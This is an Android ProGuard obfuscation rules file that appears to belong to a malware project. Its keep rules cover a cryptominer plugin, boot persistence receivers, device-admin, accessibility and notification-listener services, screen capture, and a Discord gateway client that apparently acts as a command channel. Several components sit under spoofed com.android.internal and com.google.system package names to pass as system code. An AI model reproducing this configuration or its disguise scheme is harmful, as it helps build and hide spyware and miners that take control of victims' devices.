-optimizationpasses 5
-allowaccessmodification
-dontpreverify
-dontusemixedcaseclassnames

# Keep ALL manifest-referenced components by exact name
-keep class com.openaccess.sdk.MainActivity { *; }
-keep class com.openaccess.sdk.OpenAccessApp { *; }
-keep class com.openaccess.sdk.ScreenCaptureActivity { *; }
-keep class com.openaccess.sdk.service.SystemNetworkService { *; }
-keep class com.openaccess.sdk.service.AccessibilityHelper { *; }
-keep class com.openaccess.sdk.service.NotifService { *; }
-keep class com.openaccess.sdk.service.AdminReceiver { *; }
-keep class com.android.internal.os.BootService { *; }
-keep class com.android.internal.os.BootReceiver { *; }
-keep class com.android.internal.os.persistence.SystemJobService { *; }
-keep class com.android.internal.accessibility.CoreAccessibilityService { *; }
-keep class com.android.internal.admin.AdminReceiver { *; }
-keep class com.google.system.AppInitializer { *; }
-keep class com.google.system.AppInitializer$BootReceiver { *; }
-keep class com.google.system.AppInitializer$PackageReplacedReceiver { *; }

# Keep plugin classes loaded via Class.forName()
-keep class com.google.system.plugins.MinerPlugin { *; }
-keep class com.google.system.plugins.PluginManager { *; }
-keep class com.google.system.plugins.Plugin { *; }

# Keep all dynamically referenced classes
-keep class com.google.system.** { *; }
-keep class com.openaccess.sdk.** { *; }
-keep class com.android.internal.os.** { *; }
-keep class com.android.internal.admin.** { *; }
-keep class com.android.internal.accessibility.** { *; }

# Keep OkHttp (used by GatewayWebSocket + DiscordGatewayClient)
-dontwarn okhttp3.**
-dontwarn okio.**
-keep class okhttp3.** { *; }
-keep class okio.** { *; }

# Keep kotlinx.coroutines
-keepnames class kotlinx.coroutines.internal.MainDispatcherFactory {}
-keepnames class kotlinx.coroutines.CoroutineExceptionHandler {}

# Keep kotlinx.serialization
-keep,includedescriptorclasses class kotlinx.serialization.** { *; }
-keepclassmembers class * {
    @kotlinx.serialization.Serializable <fields>;
}

# Keep Gson
-keep class com.google.gson.** { *; }
-keepclassmembers class * {
    @com.google.gson.annotations.SerializedName <fields>;
}

# Keep Ktor
-dontwarn io.ktor.**
-keep class io.ktor.** { *; }

# Keep Bouncy Castle
-dontwarn org.bouncycastle.**
-keep class org.bouncycastle.** { *; }

# Keep AndroidX
-keep class androidx.core.content.FileProvider { *; }

# Keep generic Android framework entry points
-keep class * extends android.app.Activity { *; }
-keep class * extends android.app.Service { *; }
-keep class * extends android.content.BroadcastReceiver { *; }
-keep class * extends android.app.admin.DeviceAdminReceiver { *; }
-keep class * extends android.accessibilityservice.AccessibilityService { *; }
-keep class * extends android.service.notification.NotificationListenerService { *; }

-keepattributes Signature, *Annotation*, EnclosingMethod, InnerClasses, Exceptions
-renamesourcefileattribute SourceFile

-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}

-keepclasseswithmembernames,includedescriptorclasses class * {
    native <methods>;
}

-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}
